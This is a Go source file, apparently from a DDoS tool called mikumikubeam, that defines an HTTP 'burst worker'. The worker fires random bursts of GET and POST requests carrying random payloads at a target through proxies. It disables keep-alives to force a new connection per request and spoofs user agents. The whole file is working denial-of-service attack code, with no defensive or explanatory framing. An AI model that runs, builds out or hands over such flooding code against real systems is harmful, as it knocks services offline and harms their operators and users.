package http

import (
	"bytes"
	"context"
	"io"
	"math/rand"
	"net/http"
	"sync"
	"time"

	core "github.com/sammwyy/mikumikubeam/internal/engine"
	"github.com/sammwyy/mikumikubeam/internal/netutil"
)

// burstWorker fires a random number of HTTP requests (0, 1, 2 or 3, each with
// 25% probability) per invocation. It disables keep-alives so every request
// opens a fresh connection, mimicking rapid connect -> request -> close bursts.
type burstWorker struct {
	clients sync.Map // proxy key -> *http.Client
}

func NewBurstWorker() *burstWorker { return &burstWorker{} }

func (w *burstWorker) getClient(p core.Proxy) *http.Client {
	key := proxyKey(p)
	if c, ok := w.clients.Load(key); ok {
		return c.(*http.Client)
	}
	client := netutil.DialedHTTPClient(p, 5*time.Second, 3)
	// Bursts open/close their own connection per request.
	if tr, ok := client.Transport.(*http.Transport); ok {
		tr.DisableKeepAlives = true
	}
	actual, _ := w.clients.LoadOrStore(key, client)
	return actual.(*http.Client)
}

func (w *burstWorker) Fire(ctx context.Context, params core.AttackParams, p core.Proxy, ua string, logCh chan<- core.AttackStats) error {
	payloadPoolOnce.Do(initPayloadPool)

	u := params.TargetNode.ToURL()
	target := u.String()

	// 25% chance of 0 requests -> do nothing.
	count := rand.Intn(4)
	if count == 0 {
		return nil
	}

	client := w.getClient(p)
	for i := 0; i < count; i++ {
		if ctx.Err() != nil {
			return nil
		}

		// Random payload from the pool (no per-request allocation).
		payload := payloadPool[rand.Intn(payloadPoolSize)]
		if params.PacketSize > 0 && params.PacketSize < len(payload) {
			payload = payload[:params.PacketSize]
		}

		var req *http.Request
		var err error
		// Mirror the flood worker's selection: favor GET for small sizes, POST otherwise.
		isGet := params.PacketSize <= 512 && rand.Intn(2) == 0
		if isGet {
			req, err = http.NewRequestWithContext(ctx, http.MethodGet, target+"/"+payload, nil)
		} else {
			req, err = http.NewRequestWithContext(ctx, http.MethodPost, target, io.NopCloser(bytes.NewBufferString(payload)))
		}
		if err != nil {
			return err
		}
		if ua != "" {
			req.Header.Set("User-Agent", ua)
		}

		resp, err := client.Do(req)
		if err != nil {
			return err
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		core.SendAttackLogIfVerbose(logCh, p, params.Target, params.Verbose)
	}
	return nil
}
